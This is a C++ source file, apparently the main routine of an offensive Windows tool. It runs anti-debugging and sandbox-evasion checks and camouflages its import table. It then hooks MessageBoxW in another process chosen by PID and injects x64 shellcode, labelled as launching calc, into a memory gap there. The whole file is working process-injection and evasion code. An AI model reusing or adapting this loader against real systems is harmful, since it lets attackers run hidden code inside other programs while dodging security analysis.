#include "Windows.h"
#include "API/headers/api.h"
#include "utils/headers/antianalysis.h"
#include "../headers/payload.h"


#define TARGET_FUNC	"MessageBoxW"
#define TARGET_DLL	"USER32"		
#define PID		2345			// Target Process PID

// x64 calc shellcode
unsigned char rawData[106] = {
		0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
		0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
		0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
		0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
		0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
		0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
		0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
		0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
		0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	AntiAnalysis debug;
	
	ULONG_PTR uAddress = NULL;

	auto& resolver = API::APIResolver::GetInstance();
	auto resolved	  = resolver.GetAPIAccess();

	resolver.IATCamo();
	resolver.LoadModules();
	resolver.ResolveFunctions();

	debug.IsBeingWatched(resolver); // Nuke self if in sandbox or debugger

	void* pFunctionToHook = GetProcAddress(GetModuleHandleA(TARGET_DLL), TARGET_FUNC);

	if (pFunctionToHook == nullptr)
		return -1;

	PatchHook(pFunctionToHook);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, PID);

	if (hProcess == nullptr)
		return -1;

	LocateMemoryGap(hProcess, &uAddress, reinterpret_cast<ULONG_PTR>(pFunctionToHook), sizeof(rawData) + sizeof(g_HookShellCode));

	InstallHook(hProcess, pFunctionToHook, reinterpret_cast<void*>(uAddress));

	return 0;
} 